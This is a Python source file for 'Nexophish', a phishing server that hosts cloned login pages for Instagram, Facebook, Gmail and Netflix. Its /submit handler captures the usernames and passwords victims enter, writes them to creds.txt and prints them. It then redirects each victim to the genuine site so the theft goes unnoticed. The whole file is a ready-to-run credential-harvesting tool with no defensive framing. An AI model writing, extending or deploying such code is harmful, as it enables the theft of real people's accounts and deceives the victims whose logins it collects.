import os
import sys
import http.server
import socketserver
from urllib.parse import parse_qs
from pathlib import Path

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[!] Colorama not found! Run this first:")
    print("    python3 -m venv venv && source venv/bin/activate && pip install colorama")
    sys.exit(1)

# Constants
PORT = 9000
CREDS_FILE = Path(__file__).parent.parent / "creds.txt"
TEMPLATES_DIR = Path(__file__).parent / 'templates'
current_template = None

def banner():
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + """
     ███╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗ ██╗██╗  ██╗
     ████╗  ██║██╔════╝██║  ██║██╔═══██╗██╔══██╗██║██║ ██╔╝
     ██╔██╗ ██║█████╗  ███████║██║   ██║██████╔╝██║█████╔╝ 
     ██║╚██╗██║██╔══╝  ██╔══██║██║   ██║██╔═══╝ ██║██╔═██╗ 
     ██║ ╚████║███████╗██║  ██║╚██████╔╝██║     ██║██║  ██╗
     ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝

            👾 Nexophish CLI | Port: 9000 | by Nex
    """ + Style.RESET_ALL)

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/submit':
            self.handle_form_submission()
        else:
            super().do_GET()

    def handle_form_submission(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 1024:
                self.send_error(413, "Payload too large")
                return

            post_data = self.rfile.read(content_length)
            parsed_data = parse_qs(post_data.decode('utf-8'))
            username = parsed_data.get('username', [''])[0]
            password = parsed_data.get('password', [''])[0]

            if not username or not password:
                self.send_error(400, "Username and password are required")
                return

            save_credentials(username, password, current_template)

            # Redirect based on known template
            redirects = {
                'instagram': 'https://instagram.com',
                'facebook': 'https://facebook.com',
                'gmail': 'https://mail.google.com',
                'netflix': 'https://netflix.com'
            }

            url = redirects.get(current_template)
            if url:
                self.redirect_to(url)
            else:
                self.send_error(400, f"No redirect URL configured for template: {current_template}")

        except Exception as e:
            print(Fore.RED + f"[!] Error handling POST request: {e}")
            self.send_error(500, "Internal server error")

    def redirect_to(self, url):
        self.send_response(302)
        self.send_header('Location', url)
        self.end_headers()

def save_credentials(username, password, template_name):
    try:
        CREDS_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(CREDS_FILE, "a", encoding='utf-8') as f:
            f.write(f"😉{template_name} 📛Username: {username} | 🔑Password: {password}\n")
        print(Fore.GREEN + f"[+] Saved: 😉{template_name} 📛Username: {username} | 🔑Password: {password}")
    except Exception as e:
        print(Fore.RED + f"[!] Error saving credentials: {e}")

def start_server(template_name):
    global current_template
    current_template = template_name.lower()

    template_dir = TEMPLATES_DIR / current_template
    if not template_dir.exists():
        print(Fore.RED + f"[-] Template '{current_template}' not found at {template_dir}")
        return

    os.chdir(template_dir)
    banner()

    try:
        handler = MyHandler
        with socketserver.TCPServer(("", PORT), handler) as httpd:
            print(Fore.CYAN + f"[🚀] Serving '{current_template}' at http://localhost:{PORT}")
            print(Fore.MAGENTA + f"[📁] Credentials will be saved to: {CREDS_FILE}")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Server stopped by user")
    except Exception as e:
        print(Fore.RED + f"[!] Server error: {e}")

if __name__ == '__main__':
    if len(sys.argv) > 1:
        template = sys.argv[1]
        start_server(template)
    else:
        print(Fore.YELLOW + "⚠️ Usage: python3 nexophish.py <template_name>")
        print(Fore.YELLOW + "🔸 Example: python3 nexophish.py instagram")
